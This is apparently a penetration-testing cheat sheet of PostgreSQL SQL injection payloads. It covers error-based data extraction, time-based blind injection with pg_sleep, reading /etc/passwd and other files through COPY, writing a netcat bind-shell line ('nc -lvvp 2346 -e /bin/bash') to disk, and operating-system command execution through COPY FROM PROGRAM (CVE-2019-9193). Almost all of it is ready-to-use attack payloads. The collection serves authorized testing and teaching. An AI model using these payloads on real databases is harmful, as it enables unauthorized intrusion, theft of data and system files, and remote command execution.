# POSTGRESQL

## PostgreSQL Comments

```sql
--
/**/  
```

## PostgreSQL Error Based - Basic

```sql
,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name=data_column+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)
```

## PostgreSQL Time Based

```sql
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
```

## PostgreSQL File Read

```sql
select pg_ls_dir('./');
select pg_read_file('PG_VERSION', 0, 200);
```

NOTE: ``pg_read_file` doesn't accept the `/` character.

```sql
CREATE TABLE temp(t TEXT);
COPY temp FROM '/etc/passwd';
SELECT * FROM temp limit 1 offset 0;
```

## PostgreSQL File Write

```sql
CREATE TABLE pentestlab (t TEXT);
INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');
SELECT * FROM pentestlab;
COPY pentestlab(t) TO '/tmp/pentestlab';
```

## PostgreSQL - Command execution

CVE-2019–9193, can be used from [Metasploit](https://github.com/rapid7/metasploit-framework/pull/11598) if you have a direct access to the database, otherwise you need to execute manually the following SQL queries. 

```SQL
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Drop the table you want to use if it already exists
CREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command output
COPY cmd_exec FROM PROGRAM 'id';        -- Run the system command via the COPY FROM PROGRAM function
SELECT * FROM cmd_exec;                 -- [Optional] View the results
DROP TABLE IF EXISTS cmd_exec;          -- [Optional] Remove the table
```

![https://cdn-images-1.medium.com/max/1000/1*xy5graLstJ0KysUCmPMLrw.png](https://cdn-images-1.medium.com/max/1000/1*xy5graLstJ0KysUCmPMLrw.png)

## References

* [A Penetration Tester’s Guide to PostgreSQL - David Hayter](https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9)
* [Authenticated Arbitrary Command Execution on PostgreSQL 9.3 > Latest - Mar 20 2019 - GreenWolf](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5)